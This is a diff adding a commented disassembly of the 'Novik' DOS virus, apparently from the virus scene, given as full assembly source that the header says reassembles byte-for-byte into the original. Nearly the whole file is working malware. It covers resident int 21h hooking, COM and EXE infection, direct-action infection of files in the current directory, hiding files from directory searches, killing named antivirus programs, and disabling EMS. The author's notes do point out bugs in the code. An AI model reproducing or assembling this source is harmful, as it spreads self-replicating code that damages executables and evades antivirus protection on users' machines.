@@ -1,0 +1,596 @@
+Disassembly: Novik
+Yosha
+Comment $
+Disassembly of Novik by Yosha/LT
+
+- Novik is an unusual fast infector of COM and EXE files of 1000 bytes length
+  Heavy usage of calls and jumps makes disassembling and following the virus
+  a somewhat difficult task.  There are several sections of the virus where
+  it appears there is no entry point, leaving me to conclude that the author
+  hasn't finished this virus yet.  There is *slight* anti-debug code present.
+- Novik installs to a static place in memory and hooks int 21h.  This is an
+  ineffective residency routine because once dos has booted, lowering the
+  amount of memory at 0040:0013h will not modify dos's allocation
+  behavior.
+- Chains to 011ch:109eh under dos 6.0 with blatant disregard for whatever else
+  has hooked int 21h.
+- Using the PSP as a temporary buffer for the dta and file masks (*.EXE), the
+  virus direct action infects the first executable in the directory if the
+  virus is resident.
+- The virus uses the IVT to store temporary data such as initial register
+  values.  This differs from most viruses that just zero all registers.
+- 1 or 2 bugs in the EXE infection
+- Payloads:
+  Attempts to disable EMS
+  Prints Screen under windoze
+  Hides hidden, read-only, and system files from findfirst calls
+- Assembly with tasm 4.0 should yield a byte-for-byte match with the original
+  file.  Remember to prepend 0e9h,0,0 using your favorite hex editor after
+  assembly.
+Enjoy! $
+
+.model tiny				;never learned normal declarations
+.code
+.286
+org 0h
+
+VirSeg	equ	9fc0h
+
+start:
+	;db	 0e9h,0,0		;prepend these bytes after assembling
+RealStart:
+	call	SaveRegs		;save registers
+	call	Restore 		;restore original 3 bytes of COM
+CallInstall:
+	call	Install 		;anti-debug routine and installation
+	call	DirectActionInfect	;infects first EXE in directory
+	call	Windoze_EMSJunk 	;hooks i67h (EMS) & checks 4 windoze
+	call	CheckName		;check for evil programs (AV and such)
+	call	RestoreRegs
+ModifyThis:
+	call	ExecuteHost
+	db	"WRA"                   ;probably Russian or something
+SavedOffset:				;used in EXE infections
+	dw	?
+ExecuteHost:
+	pop	ax
+	mov	ax,100h
+	push	ax
+	xor	ax,ax
+	ret
+Restore:
+	push	cs
+	pop	ds
+	mov	di,word ptr ds:[101h]	;get delta offset
+	add	di,Offset Oldbytes+103h ;di -> oldbytes
+	mov	ax,word ptr [di]	;first 2 bytes
+	mov	word ptr ds:[100h],ax	;put them at 100h
+	mov	ah,byte ptr [di+2]	;3rd byte
+	mov	byte ptr ds:[102h],ah	;put it at 102h
+	ret
+Int21Handler:
+	cmp	ax,4b00h		;file execute?
+	jz	Infect
+	cmp	ah,56h			;rename?
+	jz	CheckNameInfect
+	cmp	ah,43h			;get/set attributes?
+	jz	CheckNameInfect
+	cmp	ah,3dh			;open?
+	jz	CheckNameInfect
+	;jmp	 Exit21 		;impossible to force non-short jmp
+	db	0e9h,44h,0
+CheckNameInfect:			;scan for COM/EXE extension
+	push	ax
+	push	cx
+	push	di
+	push	si
+	mov	di,dx
+	mov	al,'.'
+	mov	cx,50h
+	cld
+	repne	scasb
+	mov	si,di
+	lodsw
+	cmp	ax,'OC'
+	jz	CheckLastLetter
+	cmp	ax,'oc'
+	jz	CheckLastLetter
+	cmp	ax,'XE'
+	jz	CheckLastLetter
+	cmp	ax,'xe'
+	jz	CheckLastLetter
+	jmp	short JmpPopExit
+CheckLastLetter:
+	lodsb
+	cmp	al,'M'
+	jz	JmpInfect
+	cmp	al,'m'
+	jz	JmpInfect
+	cmp	al,'E'
+	jz	JmpInfect
+	cmp	al,'e'
+	jz	JmpInfect
+JmpPopExit:
+	jmp	short PopExit
+JmpInfect:
+	pop	si
+	pop	di
+	pop	cx
+	pop	ax
+	jmp	short Infect
+PopExit:
+	pop	si
+	pop	di
+	pop	cx
+	pop	ax
+Exit21:
+	cmp	ah,4eh			;find first?
+	jnz	$+5
+	and	cl,-3			;don't find read-only/hidden files
+ReallyExit21:
+	db	0eah
+Old21	dd	?
+	nop				;hey!  You aren't welcome here!
+Infect:
+	push	ds
+	call	SaveRegs
+	pop	ds
+	push	dx
+	push	ds
+	push	ax
+	jmp	Infect2
+Int24Handler:
+	mov	al,3
+Int67Handler:
+	iret
+Install:
+	push	es
+	push	cx
+	pop	es
+	mov	word ptr es:[4],es
+	push	di
+	pop	si
+	jmp	short ResCheck
+DirectActionInfect:
+	call	RestoreRegs
+	push	ax
+	push	dx
+	push	cx
+	mov	word ptr ds:[50h],'.*'  ;builds *.EXE mask on PSP
+	mov	word ptr ds:[52h],'XE'
+	mov	word ptr ds:[54h],'E'
+
+	;lea	 dx,ds:[50h]		 ;set dta to PSP
+	db	8dh,16h,50h,0
+	mov	ah,1Ah
+	int	21h
+
+	mov	ah,4eh			;find first .EXE file
+	xor	cx,cx
+	int	21h
+	jmp	GetAttribs
+ResCheck:
+	sub	di,Offset OldBytes
+	push	di
+	xor	di,di
+	mov	ax,9ffeh
+	push	ax
+	pop	es
+	cmp	word ptr es:[di],'so'   ;check for 'os' in 'Novosibirsk'
+	jne	ContinueInstall
+	pop	di
+	pop	es
+	ret
+ContinueInstall:
+	pop	si
+	nop
+	mov	cx,VirSeg
+	push	cx
+	pop	es
+	mov	cx,1F4h
+	repnz	movsw
+	nop
+	pop	ax
+	dec	ax
+	push	ax
+	pop	es
+
+	xor	di,di			;allocate 1k of memory
+	add	di,3
+	mov	ax,es:[di]
+	nop
+	sub	ax,40h
+	mov	es:[di],ax
+
+	push	cx			;shrink top of memory
+	mov	ax,639			;kind of pointless, actually
+	pop	es
+	mov	word ptr es:[413h],ax
+
+	mov	ah,30h			;check dos version for tunneling
+	int	21h
+	cmp	ax,6
+	jnz	NoTunnel
+
+	mov	ax,011ch		;segment/offset of a20 under dos 6
+	push	ax
+	mov	ax,109eh
+	push	ax
+	jmp	short HookInt21
+NoTunnel:
+	mov	ax,3521h		;not under dos 6 so use normal vect
+	int	21h
+	push	es
+	push	bx
+HookInt21:
+	mov	ax,VirSeg		;store tunneled address of int 21h
+	push	ax
+	pop	es
+	pop	ax
+	mov	word ptr es:[Old21],ax
+	pop	ax
+	mov	word ptr es:[Old21+2],ax
+
+	push	es			;revector int 21h to virus
+	pop	ds
+	mov	dx,Offset Int21Handler
+	mov	ax,2521h
+	int	21h
+	jmp	HookInt8a
+
+	ret				;err... what? ;>
+Infect2:
+	xor	dx,dx			;hook int 24h to IRET
+	mov	ax,VirSeg+11
+	push	ax
+	pop	ds
+	mov	ax,2524h
+	int	8ah
+
+	pop	ax			;get file attributes
+	pop	ds
+	pop	dx
+	push	dx
+	push	ds
+	mov	ah,43h
+	push	ax
+	int	8ah
+
+	pop	ax
+	inc	ax			;clear attributes from file
+	push	cx
+	push	ax
+	and	cx,11011000b		;clear archive,system,hidden,readonly
+	int	8ah
+	jc	ExitInfect
+
+	mov	ax,3d02h		;open the file
+	int	8ah
+	xchg	ax,bx
+
+	mov	ax,5700h		;get date/time
+	int	8ah
+	push	cx
+	push	dx
+
+	xor	di,di			;read in first 18h bytes to buffer
+	mov	ax,VirSeg
+	mov	ds,ax
+	mov	dx,Offset ReadBuffer
+	mov	ax,3f00h
+	mov	cx,18h
+	int	8ah
+	jmp	short Mov2Eof
+CloseExit:
+	pop	dx			;restore date/time
+	pop	cx
+	mov	ax,5701h
+	int	8ah
+	mov	ah,3eh			;close
+	int	8ah
+ExitInfect:
+	pop	ax			;restore attributes
+	pop	cx
+	pop	ds
+	pop	dx
+	int	8ah
+	call	RestoreRegs
+	jmp	ReallyExit21
+Mov2Eof:
+	mov	di,dx			;move r/w ptr to end of file
+	xor	cx,cx
+	xor	dx,dx
+	mov	ax,4202h
+	int	8ah
+
+	cmp	word ptr [di],'ZM'      ;check for exe's
+	jz	InfectExe
+	cmp	word ptr [di],'MZ'
+	jz	CloseExit
+
+	cmp	ax,52420		;too big?
+	ja	CloseExit
+	cmp	ax,256			;too little?
+	jb	CloseExit
+
+	push	ax			;save old bytes
+	mov	ax,word ptr [ReadBuffer]
+	mov	word ptr [OldBytes],ax
+	mov	ah,byte ptr [ReadBuffer+2]
+	mov	byte ptr [OldBytes+2],ah
+
+	mov	ah,0e9h 		;create a jump
+	mov	byte ptr [ReadBuffer],ah
+	pop	ax
+	push	ax
+	sub	ax,3
+	mov	word ptr [ReadBuffer+1],ax
+
+	pop	ax			;check for infection
+	call	CheckInfect
+	jz	CloseExit
+					;modify virus code for COM files
+	mov	byte ptr ds:[ModifyThis],0e8h
+	call	WriteVirus
+	;jmp	 CloseExit
+	db	0e9h,9ah,0ffh
+GetAttribs:
+	jc	NoDAInfect
+
+	;lea	 dx,ds:[6eh]		 ;get file's attributes - 50h+1eh=6eh
+	db	8dh,16h,6eh,0
+	mov	ax,4300h
+	int	21h
+NoDAInfect:
+	pop	cx
+	pop	dx
+	pop	ax
+	push	ds
+	call	SaveRegs
+	pop	ds
+	ret
+Windoze_EMSJunk:
+	mov	ax,3567h		;get vector for EMS services
+	int	21h
+	mov	ax,word ptr es:[10]	;10 = name field in device driver
+	cmp	ax,'ME'                 ;check device driver name for EM
+	je	$+3
+	ret
+	jmp	HookInt67
+
+	db	'NOEMS'                 ;apparently not used
+
+InfectExe:
+	;cmp	 dx,5			 ;bigger than 64k*5?
+	db	81h,0fah,5,0
+	ja	JmpCloseExit		;then don't infect
+	jmp	short InfectExe2
+JmpCloseExit:
+	jmp	CloseExit
+InfectExe2:
+	push	ax
+	and	ax,511			;do bytes in last page=filesize mod 512?
+	cmp	word ptr [ReadBuffer+2],ax
+	pop	ax
+	jnz	JmpCloseExit		;if not, internal overlay so exit
+
+	mov	word ptr [SavedOffset],ax
+	mov	byte ptr [ModifyThis],0cbh	;retf
+
+	push	dx			;this is all incorrect! :<
+	push	ax
+	and	ax,0fff0h
+	add	dx,ax			;this ADD should be after the ROR!
+	mov	cl,4			;corrupts files greater than 64k :{
+	ror	dx,cl
+	sub	dx,word ptr [ReadBuffer+8]	;don't include header length
+	xchg	dx,word ptr [ReadBuffer+16h]	;change CS value
+
+	mov	word ptr [SegMod],dx	;virus' segment in memory on exec
+	pop	ax
+	push	ax
+	and	ax,0fh
+	mov	word ptr [Delta],ax	;virus' offset in memory on exec
+	add	ax,Offset ExeEntry	;set new IP in header
+	xchg	ax,word ptr [ReadBuffer+14h]
+	mov	word ptr [OldIp],ax	;store old ip
+	pop	ax
+	pop	dx
+
+	add	ax,Offset Finish
+	jnc	$+3
+	inc	dx
+	mov	cx,ax			;set filesize mod 512 at offset 2 in
+	and	cx,511			;header
+	xchg	cx,word ptr [ReadBuffer+2]
+
+	add	ax,511			;hmmm.... you can work out the
+	adc	dx,0			;the confusing ROR part for yourself
+	and	ah,0feh 		;ehehehe
+	mov	dh,ah
+	mov	cl,9			;sets new filesize in pages at offset
+	ror	dx,cl			;4 in exe header
+	mov	word ptr [ReadBuffer+4],dx
+
+	mov	ax,word ptr [ReadBuffer]
+	xchg	ah,al			;change MZ stamp to ZM stamp
+	mov	word ptr [ReadBuffer],ax
+	call	WriteVirus
+	jmp	CloseExit
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+	int	1Ah			;doh, I'll just put some code in
+	;cmp	 dx,bx			 ;that has no entry point dum de dum
+	db	39h,0dah
+	jnz	$ - 4
+	ret
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+CheckName:
+	call	RestoreRegs
+	push	ds			;check mcb:8 for special programs
+	pop	ax
+	dec	ax
+	push	ax
+	pop	ds
+	mov	ax,word ptr ds:[8]
+	cmp	ax,'IA'                 ;aidstest?
+	jz	Terminate
+	cmp	ax,'ET'                 ;testicles or something... ?
+	jz	Terminate
+	cmp	ax,'-V'                 ;AVP?
+	jz	Terminate
+	cmp	ax,'CS'                 ;mcfuck scan?
+	jz	Terminate
+	ret
+Terminate:
+	mov	ax,4c00h
+	int	21h
+HookInt67:
+	mov	ax,VirSeg		;hook int 67h (EMS services) to IRET
+	push	ax
+	pop	ds
+	mov	dx,offset Int67Handler
+	mov	ax,2567h
+	int	21h
+
+	mov	ax,4680h		;windoze 3.0 r/s mode installation check
+	int	2Fh			;returns 0 if win 3.0 is running
+	xor	al,80h			;al=0 if win 3.0 not running
+	mov	cl,al			;store in cl
+
+	mov	ax,1600h		;enhanced mode windoze check
+	int	2Fh
+
+	and	al,7Fh			;80h means XMS driver and not windoze
+	or	al,cl			;modify al if win 3.0 check returned true
+	cmp	al,0			;0 means no windoze present
+	jz	Return
+
+	int	5			;print screen under windoze hehehe
+	wait
+	int	5
+Return:
+	ret
+WriteVirus:
+	push	ds
+
+	xor	cx,cx			;move to start of file
+	xor	dx,dx
+	mov	ax,4200h
+	int	8ah
+
+	mov	dx,Offset ReadBuffer	;write new header
+	mov	cx,18h
+	mov	ah,40h
+	int	8ah
+
+	pop	ds			;and the point of this was...? ;>
+	push	ds
+
+	xor	cx,cx
+	xor	dx,dx
+	mov	ax,4202h
+	int	8ah
+
+	xor	dx,dx			;concatenate virus (damn big word)
+	mov	cx,Offset ReadBuffer
+	mov	ah,40h
+	int	8ah
+	pop	ds
+	ret
+ExeEntry:
+	mov	ax,es
+	add	ax,0
+SegMod	equ	$ - 2
+	add	ax,10h
+	push	ax
+	mov	ax,0
+OldIp	equ	$ - 2
+	push	ax
+	mov	si,0
+Delta	equ	$ - 2
+	cld
+	push	ds
+	call	SaveRegs
+	pop	ds
+	mov	di,Offset OldBytes
+	push	cs
+	pop	ds
+	add	di,si
+	jmp	CallInstall
+CheckInfect:
+	push	ax			;move r/w ptr to EOF - 2
+	dec	ax
+	dec	ax
+	mov	dx,ax
+	xor	cx,cx
+	mov	ax,4200h
+	int	8ah
+
+	push	ds			;read 2 bytes to 0:3f1h (unused part of IVT)
+	xor	ax,ax
+	push	ax
+	pop	ds
+	mov	dx,3f1h
+	inc	cx
+	inc	cx
+	mov	ah,3fh
+	int	8ah
+					;if last 2 bytes are 'sk', it's infected
+	mov	ax,word ptr ds:[3f1h]
+	pop	ds
+	cmp	ax,'ks'
+	pop	ax
+	ret
+HookInt8a:
+	xor	ax,ax			;ax=0
+	mov	es,ax			;es=0
+	mov	si,ax			;si=0
+	mov	cx,ax
+	inc	cx
+	inc	cx			;cx=2
+	mov	di,8ah*4
+	mov	ax,VirSeg+10
+	mov	ds,ax
+	repnz	movsw
+	ret
+Oldbytes:
+	nop
+	nop
+	ret
+SaveRegs:
+	push	ax
+	push	ds
+	push	ax
+	mov	ax,1eh			;upper (unused) part of IVT
+	mov	ds,ax			;used by virus as storage area ;>
+	pop	ax
+	mov	word ptr ds:[1],ax
+	mov	word ptr ds:[3],bx
+	mov	word ptr ds:[5],cx
+	mov	word ptr ds:[7],dx
+	mov	word ptr ds:[9],si
+	mov	word ptr ds:[0bh],di
+	mov	word ptr ds:[0dh],bp
+	mov	word ptr ds:[0fh],es
+	pop	ax
+	mov	word ptr ds:[11h],ax
+	pop	ax
+	ret
+RestoreRegs:
+	mov	ax,1eh			;upper (unused) part of IVT
+	mov	ds,ax			;used by virus to save registers
+	mov	ax,word ptr ds:[1]
+	mov	bx,word ptr ds:[3]
+	mov	cx,word ptr ds:[5]
+	mov	dx,word ptr ds:[7]
+	mov	si,word ptr ds:[9]
+	mov	di,word ptr ds:[0bh]
+	mov	bp,word ptr ds:[0dh]
+	mov	es,word ptr ds:[0fh]
+	mov	ds,word ptr ds:[11h]
+	ret
+Signature	db	'Novosibirsk'   ;some place in Russia
+ReadBuffer	label	near
+Finish:
+	end start
+
